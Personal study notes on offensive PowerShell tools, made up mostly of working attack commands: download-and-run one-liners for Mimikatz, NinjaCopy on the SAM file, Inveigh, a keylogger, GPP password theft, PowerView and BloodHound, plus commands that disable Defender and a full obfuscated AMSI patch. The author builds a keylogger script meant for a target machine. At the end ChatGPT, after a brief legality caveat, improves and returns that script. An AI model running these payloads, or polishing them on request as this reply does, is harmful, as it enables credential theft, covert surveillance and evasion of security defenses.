powershell is very powerfull [[Powershell Fundamentals#Intro to PS]] .A lot of attackers use powershell to do there stuff 

[we will visit popular attacks done in powershell to examine the behaviour and affects of powershell features on these popular attacks](https://github.com/clr2of8/PowerShellForInfoSec/blob/main/AttackTools/10%20Popular%20PS%20AttackTools.txt)
- mimikatz
- ninjacopy
- inveigh
- get-keystrokes
- get-GPPassword 
- power-up
- power-view
- bloodhound
- get-information
- AMSI Bypass

#### Disable antivirus 
For these attacks we have to disable windows defender 
```
set-mpppreference -Disablerealtimemonitoring $true
```

### Mimikatz
**Requires Administrator Priviledge** #post-exploitation 
Mimikatz, first written by Benjamin Delpy (a.k.a. gentilkiwi) in 2011, has simplified and largely automated the collection of credentials on Windows systems. Mimikatz provides a wealth of tools for collecting and making use of Windows credentials on target systems, including retrieval of cleartext passwords, Lan Manager hashes, and NTLM hashes, certificates, and Kerberos tickets. The tools run with varying success on all versions of Windows from XP forward, with functionality somewhat limited in Windows 8.1 and later 

#### Mimikatz overview
- the purpose of lsass.exe = LSASS.exe (local security authority subsystem service ) in a microsoft windows service responsible for providing single sign on functionality in windows so that users are not required to reauthenticate each time they access resources ("Cached and Stored Credentials ). While this is a greatly appreciated function, LSASS provides access not only to the authenticated user’s credentials but every set of credentials used by every open session since the last boot. Mimikatz exploits this cache of credentials and reports the results to the user in the various forms employed by LSASS.

![[36780.pdf]]

both the resources will  give you a better overview on mimikatz 
[[Mimikatz]]
 
#### Command Executed
```
PS>iex( iwr https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1 -usebasicparsing)

PS>Invoke-mimikatz
```
- it uses download credel 
- it will dump all the credentials stored in memory . we will not encounter plaintext password as windows disable the plaintext storing of password in lsass memory blocks
- an attacker can guess your password using tools like **johntheripper** and **hashcat** 
- we will get hashes and those hashed can be used to for **pass the hash attacks** 
- where we pass the hash intead of sending the password . 
- we can also look for online crackers which maintains a database of hashes associated with there passwords . 
#### Execution of mimikatz powershell script 
- the `invoke-mimikatz` have base64 encoded version of mimikatz executable which loads the whole string of encoded mimikatz in powershell script just like we did in [[Powershell Fundamentals#Encoded command]] and reflectively loads into current process 
- it is a very stealthy way of doing it because we are not storing the mimikatz executable in file system it bypass those detection done in file system and run that directly into the current process 

### Ninjacopy
**requires administrator priviledge** 
ninjacopy allows us to copy files that are currently in use . those file which the operating system doesn't allows to copy 
#### Ninjacopy Overview
This script can copy files off an NTFS volume by opening a read handle to the entire volume (such as c:) and parsing the NTFS structures. This requires you
are an administrator of the server. This allows you to bypass the following protections:
    1. Files which are opened by a process and cannot be opened by other processes, such as the NTDS.dit file or SYSTEM registry hives
    2. SACL flag set on a file to alert when the file is opened (I'm not using a Win32 API to open the file, so Windows has no clue)
    3. Bypass DACL's, such as a DACL which only allows SYSTEM to open a file

If the LocalDestination param is specified, the file will be copied to the file path specified on the local server (the server the script is being run from).
If the RemoteDestination param is specified, the file will be copied to the file path specified on the remote server.

The script works by opening a read handle to the volume (which if logged, may stand out, but I don't think most people log this and other processes do it too).
The script then uses NTFS parsing code written by cyb70289 and posted to CodePlex to parse the NTFS structures. Since the NTFS parsing code is written
in C++, I have compiled the code to a DLL and load it reflective in to PowerShell using the Invoke-ReflectivePEInjection.ps1 script (see below for a link
to the original script).

.DESCRIPTION

Copies a file from an NTFS partitioned volume by reading the raw volume and parsing the NTFS structures. This bypasses file DACL's,
read handle locks, and SACL's. You must be an administrator to run the script. This can be used to read SYSTEM files which are normally
locked, such as the NTDS.dit file or registry hives.


.PARAMETER Path

The full path of the file to copy (example: c:\filedir\file.txt)

.PARAMETER LocalDestination

Optional, a file path to copy the file to on the local computer. If this isn't used, RemoteDestination must be specified.

.PARAMETER RemoteDestination

Optional, a file path to copy the file to on the remote computer. If this isn't used, LocalDestination must be specified.

.PARAMETER BufferSize

Optional, how many bytes to read at a time from the file. The default is 5MB.

PowerShell will allocate a Byte[] equal to the size of this buffer, so setting this too high can cause PowerShell to use a LOT of RAM. It's
your job to figure out what "too high" is for your situation.

.PARAMETER ComputerName

Optional, an array of computernames to run the script on.


.EXAMPLE

Read the file ntds.dit from a remote server and write it to c:\test\ntds.dit on the local server
$NtdsBytes = Invoke-NinjaCopy -Path "c:\windows\ntds\ntds.dit" -ComputerName "Server1" -LocalDestination "c:\test\ntds.dit"

.EXAMPLE

Read the file ntds.dit from a remote server and copy it to the temp directory on the remote server.
Invoke-NinjaCopy -Path "c:\windows\ntds\ntds.dit" -RemoteDestination "c:\windows\temp\ntds.dit" -ComputerName "Server1"

.EXAMPLE

Read the file ntds.dit from the local server and copy it to the temp directory on the local server.
Invoke-NinjaCopy -Path "c:\windows\ntds\ntds.dit" -LocalDestination "c:\windows\temp\ntds.dit"


.NOTES
This script combines two programs. The first is Invoke-ReflectivePEInjection, links can be found below to the original source.
This is a PowerShell script which can reflectively load EXE's/DLL's.

The second program is NTFS parsing code written in C++ by cyb70289 <cyb70289@gmail.com> and posted to CodeProject. I have compiled this
code as a DLL so it can be reflectively loaded by the PowerShell script. 
The CodeProject code can be found here: http://www.codeproject.com/Articles/81456/An-NTFS-Parser-Lib

.LINK
Blog: http://clymb3r.wordpress.com/
Github repo: https://github.com/clymb3r/PowerShell
NTFS Parsing Code: http://www.codeproject.com/Articles/81456/An-NTFS-Parser-Lib
Blog on reflective loading: http://clymb3r.wordpress.com/2013/04/06/reflective-dll-injection-with-powershell/

#### Command Executed 
```
## NinjaCopy - copy sensitive files
iex( iwr https://raw.githubusercontent.com/clr2of8/PowerSploit/master/Exfiltration/Invoke-NinjaCopy.ps1 -usebasicparsing)
Invoke-NinjaCopy -path C:\Windows\System32\config\SAM -LocalDestination $env:Temp\sam
```
so if i try to copy **C:\Windows\System32\config\SAM** this file the os will not allow me to copy it . the windows will use that registary hive or file when it starts up so you will get an error that it is being used by another process . it contains password hashes of system users . 
ninjacopy can copy that file . but SAM file is encrypted we have to copy one more file to decrypt this file to get those credentials 

### Inveigh
invoke-inveigh is a tools exploits LLMNR link local multicast name resolution protocol which is used to find diveces on  a local network by multicasting . it can easily exploited if a malicious actor is on your local network it can impersonate and can ask for authentication to get your credentials (NTLMv2) hash of your computer 
for example : if you have a printer on your local network and you want find out that printers address you will use llmnr to find out that . here an attacker can impersonate as printer replay to your multicast requests and request for authentication to get the credentials there are so many other uses of this tool we can do mitm et cetera 

#### Command Executed
```
## Inveigh - LLMNR poisoning
# requires AD Domain to capture hashes
iex( iwr https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.ps1 -usebasicparsing)
Invoke-Inveigh -ConsoleOutput Y

```
it is just like **Responder**  

### Get-Keystrokes
#keylogger
its a keylogger 
#### Command Executed
```
## Keylogger
iex (iwr https://raw.githubusercontent.com/clr2of8/PowerSploit/master/Exfiltration/Get-Keystrokes.ps1 -usebasicparsing); Get-Keystrokes
cat $env:temp\key.log
```

*we also created a powershell script which will load the same thing and prior to that disable antivirus of that computer then we enabled sharing on  log file to access it in local network with smbclient or samba in general to get real time keystrokes we have to mount that samba share somewhere in linux and tail -f that . beacause samba dont have a functionality to do that . but the problem is when we run that with admin privildege it is not working means the keystrokes are not logged i am skipping that as i just want to try that out  ^side-hussle*

### Get-GPPPassword
#Exfilteration
Group Policy is essential in managing an Active Directory environment. In particular, administrators use it to centrally manage configurations applied to domain-joined servers and workstations; these Group Policies define policies (enforced settings) and preferences, which propagate default configurations that a user can modify.   
  
Unfortunately, Group Policy enabled administrators to embed passwords in Group Policy preferences that created local users or mapped network drives — and those passwords were encrypted with a [publicly available key.](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be) Therefore, an adversary with the ability to read these policies can readily extract and decrypt these passwords.  
  
In 2014, Microsoft released a [security update](https://support.microsoft.com/en-gb/help/2962486/ms14-025-vulnerability-in-group-policy-preferences-could-allow-elevati) that removes the ability to create new preferences with embedded passwords, but many organizations still have Group Policy preferences that include embedded passwords.
#### Command Executed
```
iex( iwr https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1 -usebasicparsing)
Get-GPPPassword
```

### PowerUp 
#privESC 
to find paths to escalate your priviledges . configurations which allow normal user to become an someone with more priviledge like an admin 
![[Pasted image 20240723160644.png]]
#### Command Executed
```
iex( iwr https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1 -usebasicparsing)
Invoke-AllChecks
```
as we have admin writes . it suggests we can do dll hijacking . 
there are some unquoted service paths and much more ......

### PowerView 
#recon
PowerView is a PowerShell tool to gain network situational awareness on Windows domains. It contains a set of pure-PowerShell replacements for various windows "net *" commands, which utilize PowerShell AD hooks and underlying Win32 API functions to perform useful Windows domain functionality.

It also implements various useful metafunctions, including some custom-written user-hunting functions which will identify where on the network specific users are logged into. It can also check which machines on the domain the current user has local administrator access on. Several functions for the enumeration and abuse of domain trusts also exist. See function descriptions for appropriate usage and available options. 

#### Command Executed 
```
## PowerView - Active Directory reconaissance
iex( iwr https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1 -usebasicparsing)
Get-NetLocalGroupMember
```

### Bloodhound 
#recon 
it is used to gather recon about paths in active directory environment and relationships between them . it is used by red teamer for finding the path to escalate or lateral movement and used by blue teamer for finding any misconfigurations 

#### Command Executed
```
## BloodHoud - Active Directory reconaissance
# requires AD Domain
iex( iwr https://github.com/BloodHoundAD/BloodHound/raw/master/Collectors/SharpHound.ps1 -usebasicparsing)
Invoke-BloodHound
```

### Just a Recon script 
#recon 
it print out some values of registory keys . it will give a detailed information about the local user and domain by which the user is connected to
This payload extracts information form registry and some commands. 
The information available would be dependent on the privilege with which the script would be executed.

#### Command Executed
```
## Get-Information - reconaissance script
iex( iwr https://raw.githubusercontent.com/samratashok/nishang/0090ba2e51b7503c3245081894c0fc87b696f941/Gather/Get-Information.ps1 -usebasicparsing)
Get-Information -ErrorAction SilentlyContinue
```
 it gave a huge amount of information about the system 

![[Pasted image 20240723164244.png]]
 Account lockout threshold—This is **the number of invalid log-on attempts allowed before the account is locked out**.
 it will never lockout we can try to brute force it . 
 or a password spraying attacks 

### Anti Malware Scan Interface 
powershell use this to decide if it is safe to run something in memory 
#### Command Executed 
```
$APIs = @"
using System;
using System.Runtime.InteropServices;
public class APIs {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr ekwiam, uint flNewProtect, out uint lpflOldProtect);
}
"@

Add-Type $APIs

$wzys = "0xB8"
$coxo = "0x57"
$hxuu = "0x00"
$eqhh = "0x07"
$paej = "0x80"
$ppiy = "0xC3"
$Patch = [Byte[]] ($wzys,$coxo,$hxuu,$eqhh,+$paej,+$ppiy)

$LoadLibrary = [APIs]::LoadLibrary("MpOav.dll")
$Address = [APIs]::GetProcAddress($LoadLibrary,"DllGetClassObject")
$p = 0
[APIs]::VirtualProtect($Address, [uint32]6, 0x40, [ref]$p)
[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)
$object = [Ref].Assembly.GetType('System.Ma'+'nag'+'eme'+'nt.Autom'+'ation.A'+'ms'+'iU'+'ti'+'ls')
$Uninitialize = $object.GetMethods('N'+'onPu'+'blic,st'+'at'+'ic') | Where-Object Name -eq Uninitialize
$Uninitialize.Invoke($object,$null)
```
this script will bypass amsi . the error we got when we try to run something malicious and there are some other script also and other ways to bypass amsi 
one of them is [this github repo](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell)
#keylogger-script 
```
#bypassing antivirus 
$APIs = @"
using System;
using System.Runtime.InteropServices;
public class APIs {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr ekwiam, uint flNewProtect, out uint lpflOldProtect);
}
"@

Add-Type @"
using System;
using System.Runtime.InteropServices;
public class APIs {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@
$wzys="0xB8";$coxo="0x57";$hxuu="0x00";$eqhh="0x07";$paej="0x80";$ppiy="0xC3";$Patch=[Byte[]]($wzys,$coxo,$hxuu,$eqhh,+$paej,+$ppiy);$LoadLibrary=[APIs]::LoadLibrary("MpOav.dll");$Address=[APIs]::GetProcAddress($LoadLibrary,"DllGetClassObject");$p=0;[APIs]::VirtualProtect($Address,[uint32]6,0x40,[ref]$p);[System.Runtime.InteropServices.Marshal]::Copy($Patch,0,$Address,6);$object=[Ref].Assembly.GetType('System.Ma'+'nag'+'eme'+'nt.Autom'+'ation.A'+'ms'+'iU'+'ti'+'ls');$Uninitialize=$object.GetMethods('N'+'onPu'+'blic,st'+'at'+'ic')|Where-Object Name -eq Uninitialize;$Uninitialize.Invoke($object,$null)
#setting networkcategory to private
Set-NetConnectionProfile -NetworkCategory Private
$folderPath = "C:\Users\IEUser\Pictures\Camera Roll"
$shareName = "SharedFolder"

# Check if the directory exists, create it if it doesn't
if (-not (Test-Path $folderPath)) {
    New-Item -Path $folderPath -ItemType Directory
}

# Create SMB share
New-SmbShare -Name $shareName -Path $folderPath -FullAccess "Everyone"

# Set permissions on the shared folder
$acl = Get-Acl $folderPath
$permission = "Everyone", "Modify", "ContainerInherit,ObjectInherit", "None", "Allow"
$rule = New-Object System.Security.AccessControl.FileSystemAccessRule $permission
$acl.SetAccessRule($rule)
Set-Acl -Path $folderPath -AclObject $acl

# Ensure firewall allows SMB traffic
$firewallRule = Get-NetFirewallRule -DisplayName "File and Printer Sharing (SMB-In)"
if ($firewallRule -eq $null) {
    Enable-NetFirewallRule -DisplayName "File and Printer Sharing (SMB-In)"
}

# Verify and manage shares
Get-SmbShare
#disable antivirus and i dont think it is relevent to do this step to disable windows antivirus 
Set-MpPreference -DisableRealtimeMonitoring $true
#download credel to donwload keylogger 
iex (iwr https://raw.githubusercontent.com/clr2of8/PowerSploit/master/Exfiltration/Get-Keystrokes.ps1 -usebasicparsing)
get-keystrokes -logpath C:\Users\Public\Pictures\camera-settings.log
```
this script is not completed . i have to make more modification to this script to perfect this to deploy on target machine . more obfuscation when bypassing  amsi and then disabling realtimeprotection 

#### ChatGPT response on this script 
```As a pentester, it's crucial to ensure that your activities are performed within legal boundaries and with explicit permission from the organization you are testing. Here are a few points and improvements to consider for your script:

1. **Ethical and Legal Compliance**:
    
    - Ensure you have proper authorization for the penetration test.
    - Document your actions and obtain written consent from the client.
2. **Improving the Script**:
    
    - Use comments to clearly explain each step.
    - Add error handling to ensure the script can recover gracefully if something goes wrong.
    - Log activities for auditing and reporting purposes.

Here's a revised version of your script with some improvements:



# Bypassing AMSI
$APIs = @"
using System;
using System.Runtime.InteropServices;
public class APIs {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@

Add-Type $APIs

# Patch AMSI to bypass detection
$wzys = 0xB8; $coxo = 0x57; $hxuu = 0x00; $eqhh = 0x07; $paej = 0x80; $ppiy = 0xC3
$Patch = [Byte[]]($wzys, $coxo, $hxuu, $eqhh, $paej, $ppiy)
$LoadLibrary = [APIs]::LoadLibrary("MpOav.dll")
$Address = [APIs]::GetProcAddress($LoadLibrary, "DllGetClassObject")
$p = 0
[APIs]::VirtualProtect($Address, [uint32]6, 0x40, [ref]$p)
[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)

# Uninitialize AMSI
$object = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$Uninitialize = $object.GetMethods('NonPublic,Static') | Where-Object Name -eq 'Uninitialize'
$Uninitialize.Invoke($object, $null)

# Setting network category to private
Set-NetConnectionProfile -NetworkCategory Private

# Define folder path and share name
$folderPath = "C:\Users\IEUser\Pictures\Camera Roll"
$shareName = "SharedFolder"

# Check if the directory exists, create it if it doesn't
if (-not (Test-Path $folderPath)) {
    New-Item -Path $folderPath -ItemType Directory
}

# Create SMB share with full access
New-SmbShare -Name $shareName -Path $folderPath -FullAccess "Everyone"

# Set permissions on the shared folder
$acl = Get-Acl $folderPath
$permission = "Everyone", "Modify", "ContainerInherit,ObjectInherit", "None", "Allow"
$rule = New-Object System.Security.AccessControl.FileSystemAccessRule $permission
$acl.SetAccessRule($rule)
Set-Acl -Path $folderPath -AclObject $acl

# Ensure firewall allows SMB traffic
$firewallRule = Get-NetFirewallRule -DisplayName "File and Printer Sharing (SMB-In)"
if ($firewallRule -eq $null) {
    Enable-NetFirewallRule -DisplayName "File and Printer Sharing (SMB-In)"
}

# Verify and manage shares
Get-SmbShare

# Disable Windows Defender real-time protection
Set-MpPreference -DisableRealtimeMonitoring $true

# Download and execute keylogger
$keystrokeScriptUrl = "https://raw.githubusercontent.com/clr2of8/PowerSploit/master/Exfiltration/Get-Keystrokes.ps1"
Invoke-Expression (Invoke-WebRequest -Uri $keystrokeScriptUrl -UseBasicParsing).Content
Get-Keystrokes -LogPath "C:\Users\Public\Pictures\camera-settings.log"

### Additional Recommendations:

- **Error Handling**: Implement try-catch blocks to handle potential errors gracefully.
- **Logging**: Add logging to record each step for reporting purposes.
- **Clean Up**: Include a clean-up script to restore the system to its original state after testing.

If you have any specific requirements or need further customization, feel free to ask!

4o
```
